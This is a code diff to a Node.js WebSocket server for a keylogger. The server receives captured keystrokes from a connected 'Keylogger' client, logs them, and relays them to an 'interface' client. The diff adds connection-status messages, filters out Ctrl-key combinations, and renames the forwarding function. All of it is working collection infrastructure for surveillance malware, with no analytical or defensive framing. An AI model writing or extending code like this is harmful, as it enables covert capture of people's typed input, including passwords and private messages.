@@ -43,27 +43,62 @@ const startWSServer = () => {
 			console.log('Keylogger connected!');
 			clients.keylogger = socket;
 
+			sendDataToInterface(
+				JSON.stringify({
+					type: 'status',
+					data: {
+						status: 'on'
+					}
+				})
+			);
+
 			socket.on('message', (data) => {
-				const { timestamp, keyPressed } = JSON.parse(data);
+				// if one combination was pressed: ctrl + letter, it will be ignored
+				if (!data.split(',')[1].split(':')[1].includes(`\\x`)) {
+					const { timestamp, keyPressed } = JSON.parse(data);
 
-				console.log(`${timestamp}: Keypressed: ${keyPressed}`);
+					console.log(`${timestamp}: Keypressed: ${keyPressed}`);
 
-				//send to interface
-				sendTheKeysFromLoggerToInterface(
-					JSON.stringify({
-						timestamp,
-						keyPressed
-					})
-				);
+					//send to interface
+					sendDataToInterface(
+						JSON.stringify({
+							type: 'key',
+							data: {
+								timestamp,
+								keyPressed
+							}
+						})
+					);
+				}
 			});
 
 			socket.on('close', (data) => {
 				console.log('Keylogger disconnected!');
+
+				sendDataToInterface(
+					JSON.stringify({
+						type: 'status',
+						data: {
+							status: 'off'
+						}
+					})
+				);
+
 				clients.keylogger = null;
 			});
 
 			socket.on('error', (error) => {
 				console.log(`Socket Error ${error}: Keylogger disconnected!`);
+
+				sendDataToInterface(
+					JSON.stringify({
+						type: 'status',
+						data: {
+							status: 'off'
+						}
+					})
+				);
+
 				clients.keylogger = null;
 			});
 		}
@@ -125,7 +160,7 @@ const startWSServer = () => {
 	server.listen(30401);
 };
 
-const sendTheKeysFromLoggerToInterface = (data) => {
+const sendDataToInterface = (data) => {
 	if (clients.interface) {
 		clients.interface.send(data);
 	}
